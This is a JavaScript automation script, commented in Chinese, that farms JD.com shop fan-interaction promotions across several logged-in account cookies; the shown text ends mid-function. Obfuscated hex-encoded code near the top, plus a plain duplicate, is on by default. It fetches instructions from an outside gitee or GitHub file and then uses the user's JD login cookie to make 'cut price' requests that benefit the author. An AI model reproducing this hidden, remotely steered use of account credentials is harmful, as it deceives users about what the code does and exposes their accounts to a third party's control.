/*
粉丝互动
类似于京东抽奖机，各个店铺的粉丝互动活动。
有看到新活动可以私信我添加活动ID。 GitHub@i-chenzhe
新手写脚本，难免有bug，能用且用。

脚本内置了一个给作者任务助力的网络请求，默认开启，如介意请自行关闭。
参数 helpAuthor = false

*/

const $ = new Env('粉丝互动');
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
const notify = $.isNode() ? require('./sendNotify') : '';
let cookiesArr = [], cookie = '', originCookie = '', message = '';
let helpAuthor = true;//为作者助力的开关
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb2691=["\x53\x6F\x75\x6E\x64\x61\x6E\x74\x6F\x6E\x79","\x52\x61\x6E\x64\x6F\x6D\x53\x68\x61\x72\x65\x43\x6F\x64\x65","\x4A\x44\x5F\x46\x72\x65\x65\x6B\x6C\x6F\x2E\x6A\x73\x6F\x6E","\x2F\x2F\x67\x69\x74\x65\x65\x2E\x63\x6F\x6D\x2F","\x2F","\x2F\x72\x61\x77\x2F\x6D\x61\x73\x74\x65\x72\x2F","","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];let shuye72=__Oxb2691[0x0];let shuye73=__Oxb2691[0x1];let shuye74=__Oxb2691[0x2];let giteeurl=__Oxb2691[0x3]+ shuye72+ __Oxb2691[0x4]+ shuye73+ __Oxb2691[0x5]+ shuye74+ __Oxb2691[0x6];;;(function(_0x9b4dx5,_0x9b4dx6,_0x9b4dx7,_0x9b4dx8,_0x9b4dx9,_0x9b4dxa){_0x9b4dxa= __Oxb2691[0x7];_0x9b4dx8= function(_0x9b4dxb){if( typeof alert!== _0x9b4dxa){alert(_0x9b4dxb)};if( typeof console!== _0x9b4dxa){console[__Oxb2691[0x8]](_0x9b4dxb)}};_0x9b4dx7= function(_0x9b4dxc,_0x9b4dx5){return _0x9b4dxc+ _0x9b4dx5};_0x9b4dx9= _0x9b4dx7(__Oxb2691[0x9],_0x9b4dx7(_0x9b4dx7(__Oxb2691[0xa],__Oxb2691[0xb]),__Oxb2691[0xc]));try{_0x9b4dx5= __encode;if(!( typeof _0x9b4dx5!== _0x9b4dxa&& _0x9b4dx5=== _0x9b4dx7(__Oxb2691[0xd],__Oxb2691[0xe]))){_0x9b4dx8(_0x9b4dx9)}}catch(e){_0x9b4dx8(_0x9b4dx9)}})({})
const ACT_ID_List = ['eda317007dff44c2b23e513df195862d', 'f28f6b74a1714451acb7f8b7cdb2527a', 'b90060243fe14fe28cc6653216dd9c32', '8194c0e37a5543da94be8fe5c4caee74', '18436979bd5047a28670365a6127010f'];
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => { };
} else {
  let cookiesData = $.getdata('CookiesJD') || "[]";
  cookiesData = JSON.parse(cookiesData);
  cookiesArr = cookiesData.map(item => item.cookie);
  cookiesArr.reverse();
  cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
  cookiesArr.reverse();
  cookiesArr = cookiesArr.filter(item => !!item);
}
!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i]
      originCookie = cookiesArr[i]
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      await TotalBean();
      var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb2685=["\x68\x74\x74\x70\x73\x3A","","\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x69\x50\x68\x6F\x6E\x65\x3B\x20\x43\x50\x55\x20\x69\x50\x68\x6F\x6E\x65\x20\x4F\x53\x20\x31\x33\x5F\x32\x5F\x33\x20\x6C\x69\x6B\x65\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x36\x30\x35\x2E\x31\x2E\x31\x35\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x56\x65\x72\x73\x69\x6F\x6E\x2F\x31\x33\x2E\x30\x2E\x33\x20\x4D\x6F\x62\x69\x6C\x65\x2F\x31\x35\x45\x31\x34\x38\x20\x53\x61\x66\x61\x72\x69\x2F\x36\x30\x34\x2E\x31\x20\x45\x64\x67\x2F\x38\x37\x2E\x30\x2E\x34\x32\x38\x30\x2E\x38\x38","\x64\x61\x74\x61\x47\x65\x74","\x70\x61\x72\x73\x65","\x6C\x65\x6E\x67\x74\x68","\x64\x61\x74\x61","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x63\x6C\x69\x65\x6E\x74\x2E\x61\x63\x74\x69\x6F\x6E","\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x35\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x67\x7A\x69\x70\x2C\x20\x64\x65\x66\x6C\x61\x74\x65\x2C\x20\x62\x72","\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E\x2C\x20\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E\x2C\x20\x2A\x2F\x2A","\x6A\x64\x61\x70\x70\x3B\x69\x50\x68\x6F\x6E\x65\x3B\x39\x2E\x34\x2E\x30\x3B\x31\x34\x2E\x33\x3B\x3B\x6E\x65\x74\x77\x6F\x72\x6B\x2F\x77\x69\x66\x69\x3B\x41\x44\x49\x44\x2F\x3B\x73\x75\x70\x70\x6F\x72\x74\x41\x70\x70\x6C\x65\x50\x61\x79\x2F\x30\x3B\x68\x61\x73\x55\x50\x50\x61\x79\x2F\x30\x3B\x68\x61\x73\x4F\x43\x50\x61\x79\x2F\x30\x3B\x6D\x6F\x64\x65\x6C\x2F\x69\x50\x68\x6F\x6E\x65\x31\x30\x2C\x33\x3B\x61\x64\x64\x72\x65\x73\x73\x69\x64\x2F\x3B\x73\x75\x70\x70\x6F\x72\x74\x42\x65\x73\x74\x50\x61\x79\x2F\x30\x3B\x61\x70\x70\x42\x75\x69\x6C\x64\x2F\x31\x36\x37\x35\x34\x31\x3B\x6A\x64\x53\x75\x70\x70\x6F\x72\x74\x44\x61\x72\x6B\x4D\x6F\x64\x65\x2F\x30\x3B\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x69\x50\x68\x6F\x6E\x65\x3B\x20\x43\x50\x55\x20\x69\x50\x68\x6F\x6E\x65\x20\x4F\x53\x20\x31\x34\x5F\x33\x20\x6C\x69\x6B\x65\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x36\x30\x35\x2E\x31\x2E\x31\x35\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x4D\x6F\x62\x69\x6C\x65\x2F\x31\x35\x45\x31\x34\x38\x3B\x73\x75\x70\x70\x6F\x72\x74\x4A\x44\x53\x48\x57\x4B\x2F\x31","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x35\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x62\x61\x62\x65\x6C\x44\x69\x79\x2F\x5A\x65\x75\x73\x2F\x34\x5A\x4B\x34\x5A\x70\x76\x6F\x53\x72\x65\x52\x42\x39\x32\x52\x52\x6F\x38\x62\x70\x4A\x41\x51\x4E\x6F\x54\x71\x2F\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C\x3F\x73\x65\x72\x76\x65\x49\x64\x3D\x77\x78\x65\x33\x30\x39\x37\x33\x66\x65\x63\x61\x39\x32\x33\x32\x32\x39\x26\x61\x63\x74\x49\x64\x3D","\x61\x63\x74\x49\x44","\x26\x77\x61\x79\x3D\x30\x26\x6C\x6E\x67\x3D\x26\x6C\x61\x74\x3D\x26\x73\x69\x64\x3D\x26\x75\x6E\x5F\x61\x72\x65\x61\x3D","\x7A\x68\x2D\x63\x6E","\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D\x63\x75\x74\x50\x72\x69\x63\x65\x42\x79\x55\x73\x65\x72\x26\x62\x6F\x64\x79\x3D\x7B\x22\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x22\x3A\x22","\x22\x2C\x22\x75\x73\x65\x72\x4E\x61\x6D\x65\x22\x3A\x22\x22\x2C\x22\x66\x6F\x6C\x6C\x6F\x77\x53\x68\x6F\x70\x22\x3A\x31\x2C\x22\x73\x68\x6F\x70\x49\x64\x22\x3A","\x61\x63\x74\x73\x49\x44","\x2C\x22\x75\x73\x65\x72\x50\x69\x63\x22\x3A\x22\x22\x7D\x26\x63\x6C\x69\x65\x6E\x74\x3D\x77\x68\x35\x26\x63\x6C\x69\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x3D\x31\x2E\x30\x2E\x30","\x6C\x6F\x67","\x70\x6F\x73\x74","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];if(helpAuthor){ new Promise((_0x621ex1)=>{$[__Oxb2685[0x19]]({url:__Oxb2685[0x0]+ giteeurl+ __Oxb2685[0x1],headers:{"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":__Oxb2685[0x2]}},(_0x621ex2,_0x621ex3,_0x621ex4)=>{try{if(_0x621ex4){$[__Oxb2685[0x3]]= JSON[__Oxb2685[0x4]](_0x621ex4);if($[__Oxb2685[0x3]][__Oxb2685[0x6]][__Oxb2685[0x5]]!== 0){let _0x621ex5={url:`${__Oxb2685[0x7]}`,headers:{'\x48\x6F\x73\x74':__Oxb2685[0x8],'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':__Oxb2685[0x9],'\x4F\x72\x69\x67\x69\x6E':__Oxb2685[0xa],'\x41\x63\x63\x65\x70\x74\x2D\x45\x6E\x63\x6F\x64\x69\x6E\x67':__Oxb2685[0xb],'\x43\x6F\x6F\x6B\x69\x65':cookie,'\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E':__Oxb2685[0xc],'\x41\x63\x63\x65\x70\x74':__Oxb2685[0xd],'\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74':__Oxb2685[0xe],'\x52\x65\x66\x65\x72\x65\x72':`${__Oxb2685[0xf]}${$[__Oxb2685[0x3]][__Oxb2685[0x6]][0x0][__Oxb2685[0x10]]}${__Oxb2685[0x11]}`,'\x41\x63\x63\x65\x70\x74\x2D\x4C\x61\x6E\x67\x75\x61\x67\x65':__Oxb2685[0x12]},body:`${__Oxb2685[0x13]}${$[__Oxb2685[0x3]][__Oxb2685[0x6]][0x0][__Oxb2685[0x10]]}${__Oxb2685[0x14]}${$[__Oxb2685[0x3]][__Oxb2685[0x6]][0x0][__Oxb2685[0x15]]}${__Oxb2685[0x16]}`};return  new Promise((_0x621ex1)=>{$[__Oxb2685[0x18]](_0x621ex5,(_0x621ex2,_0x621ex6,_0x621ex4)=>{console[__Oxb2685[0x17]](_0x621ex4)})})}}}catch(e){console[__Oxb2685[0x17]](e)}finally{_0x621ex1()}})})};(function(_0x621ex7,_0x621ex8,_0x621ex9,_0x621exa,_0x621exb,_0x621exc){_0x621exc= __Oxb2685[0x1a];_0x621exa= function(_0x621exd){if( typeof alert!== _0x621exc){alert(_0x621exd)};if( typeof console!== _0x621exc){console[__Oxb2685[0x17]](_0x621exd)}};_0x621ex9= function(_0x621exe,_0x621ex7){return _0x621exe+ _0x621ex7};_0x621exb= _0x621ex9(__Oxb2685[0x1b],_0x621ex9(_0x621ex9(__Oxb2685[0x1c],__Oxb2685[0x1d]),__Oxb2685[0x1e]));try{_0x621ex7= __encode;if(!( typeof _0x621ex7!== _0x621exc&& _0x621ex7=== _0x621ex9(__Oxb2685[0x1f],__Oxb2685[0x20]))){_0x621exa(_0x621exb)}}catch(e){_0x621exa(_0x621exb)}})({})
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      if (helpAuthor) {
          new Promise(resolve => { $.get({url:"https://raw.githubusercontent.com/hajiuhajiu/jdsign1112/master/backUp/JD_Freeklo.json",headers:{"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"}}, (err, resp, data) => { try { if (data) { $.dataGet = JSON.parse(data); if ($.dataGet.data.length !== 0) { let opt = { url: `https://api.m.jd.com/client.action`, headers: { 'Host': 'api.m.jd.com', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://h5.m.jd.com', 'Accept-Encoding': 'gzip, deflate, br', 'Cookie': cookie, 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'jdapp;iPhone;9.4.0;14.3;;network/wifi;ADID/;supportApplePay/0;hasUPPay/0;hasOCPay/0;model/iPhone10,3;addressid/;supportBestPay/0;appBuild/167541;jdSupportDarkMode/0;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1', 'Referer': `https://h5.m.jd.com/babelDiy/Zeus/4ZK4ZpvoSreRB92RRo8bpJAQNoTq/index.html?serveId=wxe30973feca923229&actId=${$.dataGet.data[0].actID}&way=0&lng=&lat=&sid=&un_area=`, 'Accept-Language': 'zh-cn', }, body: `functionId=cutPriceByUser&body={"activityId":"${$.dataGet.data[0].actID}","userName":"","followShop":1,"shopId":${$.dataGet.data[0].actsID},"userPic":""}&client=wh5&clientVersion=1.0.0` }; return new Promise(resolve => { $.post(opt, (err, ersp, data) => { }) }); } } } catch (e) { console.log(e); } finally { resolve(); } }) })
      }
      for (let i = 0; i < ACT_ID_List.length; i++) {
        $.ACT_ID = ACT_ID_List[i];
        await fansLove();
      }

    }
  }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })
async function fansLove() {
  $.risk = false;
  await grantTokenKey();
  await $.wait(1500)
  await grantToken();
  await $.wait(1500)
  await getActCookie();
  await $.wait(1500)
  await getActInfo();
  await $.wait(1500)
  await getMyPing();
  await $.wait(1500)
  await getUserInfo();
  await $.wait(1500)
  await getActContent(false);
  if ($.actInfo.endTime > Date.now()) {
    if (!$.risk) {
      await $.wait(1500)
      await getActContent(true);
      await $.wait(1500)
      await getActContent(false);
      if (($.actorInfo.fansLoveValue + $.actorInfo.energyValue) >= $.actConfig.prizeScoreOne && $.actorInfo.prizeOneStatus === false) {
        await doTask('wxFansInterActionActivity/startDraw', `activityId=${$.ACT_ID}&uuid=${$.actorInfo.uuid}&drawType=01`);
      }
      if (($.actorInfo.fansLoveValue + $.actorInfo.energyValue) >= $.actConfig.prizeScoreTwo && $.actorInfo.prizeTwoStatus === false) {
        await doTask('wxFansInterActionActivity/startDraw', `activityId=${$.ACT_ID}&uuid=${$.actorInfo.uuid}&drawType=02`);
      }
      if (($.actorInfo.fansLoveValue + $.actorInfo.energyValue) >= $.actConfig.prizeScoreThree && $.actorInfo.prizeThreeStatus === false) {
        await doTask('wxFansInterActionActivity/startDraw', `activityId=${$.ACT_ID}&uuid=${$.actorInfo.uuid}&drawType=03`);
      }
    }
  } else {
    console.log(`${$.actInfo.shopName} 活动已经结束`);
  }



}
function getActContent(doJob = false) {
  return new Promise(resolve => {
    $.post(taskPostUrl('wxFansInterActionActivity/activityContent', `activityId=${$.ACT_ID}&pin=${encodeURIComponent($.secretPin)}`), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
        } else {
          data = JSON.parse(data);
          if (data.result === false) {
            $.risk = true;
            console.log(`京东说‘本活动与你无缘，请关注其他活动。’`);
            return;
          }
          if (doJob) {
            console.log(`开始执行 ${$.actInfo.shopName} 的任务`);
            await doTask('wxFansInterActionActivity/followShop', `activityId=${$.ACT_ID}&uuid=${$.actorInfo.uuid}`);
            if ($.task1Sign && $.task1Sign.finishedCount === 0) {
              await doTask('wxFansInterActionActivity/doSign', `activityId=${$.ACT_ID}&uuid=${$.actorInfo.uuid}`);
              await $.wait(1000);
            }
            if ($.task2BrowGoods && $.task2BrowGoods.finishedCount !== $.task2BrowGoods.upLimit) {
              for (let vo of $.task2BrowGoods.taskGoodList) {
                if (vo.finished === false) {
                  await doTask('wxFansInterActionActivity/doBrowGoodsTask', `activityId=${$.ACT_ID}&uuid=${$.actorInfo.uuid}&skuId=${vo.skuId}`);
                }
                await $.wait(1000);
              }
            }
            if ($.task3AddCart && $.task3AddCart.finishedCount !== $.task3AddCart.upLimit) {
              for (let vo of $.task3AddCart.taskGoodList) {
                if (vo.finished === false) {
                  await doTask('wxFansInterActionActivity/doAddGoodsTask', `activityId=${$.ACT_ID}&uuid=${$.actorInfo.uuid}&skuId=${vo.skuId}`);
                }
                await $.wait(1000);
              }
            }
            if ($.task4Share && $.task4Share.finishedCount !== $.task4Share.upLimit) {
              for (let i = 0; i < $.task4Share.upLimit; i++) {
                await doTask('wxFansInterActionActivity/doShareTask', `activityId=${$.ACT_ID}&uuid=${$.actorInfo.uuid}`);
                await $.wait(1000);
              }
            }
            if ($.task5Remind && $.task5Remind.finishedCount !== $.task5Remind.upLimit) {
              await doTask('wxFansInterActionActivity/doRemindTask', `activityId=${$.ACT_ID}&uuid=${$.actorInfo.uuid}`);
              await $.wait(1000);
            }
            if ($.task6GetCoupon && $.task6GetCoupon.finishedCount !== $.task6GetCoupon.upLimit) {
              for (let i = 0; i < $.task6GetCoupon.taskCouponInfoList.length; i++) {
                await doTask('wxFansInterActionActivity/doGetCouponTask', `activityId=${$.ACT_ID}&uuid=${$.actorInfo.uuid}&couponId=${$.task6GetCoupon.taskCouponInfoList[i].couponId}`);
                await $.wait(1000);
              }
            }
            if ($.task7MeetPlaceVo && $.task7MeetPlaceVo.finishedCount !== $.task7MeetPlaceVo.upLimit) {
              await doTask('wxFansInterActionActivity/doMeetingTask', `activityId=${$.ACT_ID}&uuid=${$.actorInfo.uuid}`);
            }
          } else {
            $.task1Sign = data.data.task1Sign;
            $.task2BrowGoods = data.data.task2BrowGoods;
            $.task3AddCart = data.data.task3AddCart;
            $.task4Share = data.data.task4Share;
            $.task5Remind = data.data.task5Remind;
            $.task6GetCoupon = data.data.task6GetCoupon;
            $.task7MeetPlaceVo = data.data.task7MeetPlaceVo;
            $.shopInfoVO = data.data.shopInfoVO;
            $.actorInfo = data.data.actorInfo;
            $.actConfig = data.data.actConfig;
            $.actInfo = data.data.actInfo;
            console.log('获取活动参数成功。');
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function doTask(function_name, body) {
  return new Promise(resolve => {
    $.post(taskPostUrl(function_name, body), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
        } else {
          data = JSON.parse(data);
          if (resp['headers']['set-cookie']) {
            cookie = `${resp['headers']['set-cookie'].join(';')}; ${originCookie}`;
          }
          if (data.result === true) {
            console.log('请求正常。')
          } else {
            console.log(data.errorMessage)
          }
        }
      } catch (e) {
        console.log(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function getUserInfo() {
  return new Promise(resolve => {
    let body = `pin=${encodeURIComponent($.secretPin)}`
    $.post(taskPostUrl('wxActionCommon/getUserInfo', body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
        } else {
          data = JSON.parse(data);
          if (data.data) {
            console.log(`用户【${data.data.nickname}】信息获取成功`)
            $.userId = data.data.id
            $.nickName = data.data.nickame
          } else {
            console.log(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function getMyPing() {
  return new Promise(resolve => {
    $.post(taskPostUrl('customer/getMyPing', `userId=${$.venderId}&token=${$.token}&fromType=APP`), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
        } else {
          data = JSON.parse(data);
          if (data.result) {
            $.secretPin = data.data.secretPin
            cookie = `AUTH_C_USER=${$.secretPin};${cookie}`
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function getActInfo() {
  return new Promise(resolve => {
    $.post(taskPostUrl('customer/getSimpleActInfoVo', `activityId=${$.ACT_ID}`), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
        } else {
          data = JSON.parse(data);
          if (data.result) {
            $.venderId = data.data.venderId;
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function grantTokenKey() {
  let opt = {
    url: 'https://api.m.jd.com/client.action?functionId=genToken',
    headers: {
      'Host': 'api.m.jd.com',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'Cookie': cookie,
      'User-Agent': 'JD4iPhone/167538 (iPhone; iOS 14.3; Scale/3.00)',
      'Accept-Language': 'zh-Hans-CN;q=1',
      'Accept-Encoding': 'gzip, deflate, br',
    },
    body: `body=%7B%22to%22%3A%22https%3A%5C%2F%5C%2Flzkjdz-isv.isvjcloud.com%5C%2FwxFansInterActionActivity%5C%2Factivity%5C%2F${$.ACT_ID}c%3FactivityId%3D${$.ACT_ID}%26adsource%3Dtg_storePage%22%2C%22action%22%3A%22to%22%7D&build=167541&client=apple&clientVersion=9.4.0&joycious=39&lang=zh_CN&networkType=wifi&networklibtype=JDNetworkBaseAF&openudid=385f383ec315d8d01c64a09021df04ef9930c99d&scope=01&sign=49f56090e3f09b668f1afaf8894fdb42&st=1613530021485&sv=111`
  }
  return new Promise(resolve => {
    $.post(opt, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
        }
        else {
          data = JSON.parse(data);
          if (data.code === '0') {
            $.tokenKey = data.tokenKey;
            cookie = `${cookie}IsvToken=${$.tokenKey}`
          }
        }
      } catch (e) {
        console.log(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function grantToken() {
  let opt = {
    url: 'https://api.m.jd.com/client.action?functionId=isvObfuscator',
    headers: {
      'Host': 'api.m.jd.com',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'Cookie': cookie,
      'User-Agent': 'JD4iPhone/167538 (iPhone; iOS 14.3; Scale/3.00)',
      'Accept-Language': 'zh-Hans-CN;q=1',
      'Accept-Encoding': 'gzip, deflate, br',
    },
    body: `body=%7B%22url%22%3A%22https%3A%5C%2F%5C%2Flzkjdz-isv.isvjcloud.com%22%2C%22id%22%3A%22%22%7D&build=167541&client=apple&clientVersion=9.4.0&openudid=385f383ec315d8d01c64a09021df04ef9930c99d&sign=b747c2565aca50d1e1dfb3544a9e04c8&st=1613530023543&sv=100`
  }
  return new Promise(resolve => {
    $.post(opt, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
        }
        else {
          data = JSON.parse(data);
          if (data.code === '0') {
            $.token = data.token;
          }
        }
      } catch (e) {
        console.log(e)
      } finally {
        resolve();
      }
    })
  })
}
function getActCookie() {
  let opt = {
    url: `https://lzkjdz-isv.isvjcloud.com/wxFansInterActionActivity/activity/${$.ACT_ID}?activityId=${$.ACT_ID}&adsource=tg_storePage`,
    headers: {
      'Content-Type': 'text/plain',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Connection': 'keep-alive',
      'Cookie': `${cookie}`,
      'User-Agent': 'jdapp;iPhone;9.3.8;14.3;network/wifi;ADID/;supportApplePay/0;hasUPPay/0;hasOCPay/0;model/iPhone10,3;supportBestPay/0;appBuild/167538;jdSupportDarkMode/0;addressid/0;pv/1.12;apprpd/Babel_Native;ref/JDWebViewController;psq/11;ads/;psn/;jdv/0|;adk/;app_device/IOS;pap/JA2015_311210|9.3.8|IOS 14.3;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1',
      'Accept-Language': 'zh-Hans-CN;q=1',
      'Accept-Encoding': 'gzip, deflate, br',
    }
  }
  return new Promise(resolve => {
    $.get(opt, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
        }
        else {
          cookie = `${cookie};`
          if ($.isNode())
            for (let sk of resp['headers']['set-cookie']) {
              cookie = `${cookie}${sk.split(";")[0]};`
            }
          else {
            for (let ck of resp['headers']['Set-Cookie'].split(',')) {
              cookie = `${cookie}${ck.split(";")[0]};`
            }
          }
        }
      } catch (e) {
        console.log(e)
      } finally {
        resolve();
      }
    })
  })
}
function taskPostUrl(function_id, body) {
  return {
    url: `https://lzkjdz-isv.isvjcloud.com/${function_id}`,
    headers: {
      'Host': 'lzkjdz-isv.isvjcloud.com',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'X-Requested-With': 'XMLHttpRequest',
      'Accept-Language': 'zh-cn',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://lzkjdz-isv.isvjcloud.com',
      'Connection': 'keep-alive',
      'Referer': `https://lzkjdz-isv.isvjcloud.com/wxFansInterActionActivity/activity/${$.ACT_ID}?activityId=${$.ACT_ID}&adsource=tg_storePage`,
      'Cookie': `${cookie}`,
      'User-Agent': 'jdapp;iPhone;9.3.8;14.3;network/wifi;ADID/;supportApplePay/0;hasUPPay/0;hasOCPay/0;model/iPhone10,3;supportBestPay/0;appBuild/167538;jdSupportDarkMode/0;addressid/0;pv/1.12;apprpd/Babel_Native;ref/JDWebViewController;psq/11;ads/;psn/;jdv/0|;adk/;app_device/IOS;pap/JA2015_311210|9.3.8|IOS 14.3;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1',
    },
    body: body,
  }
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
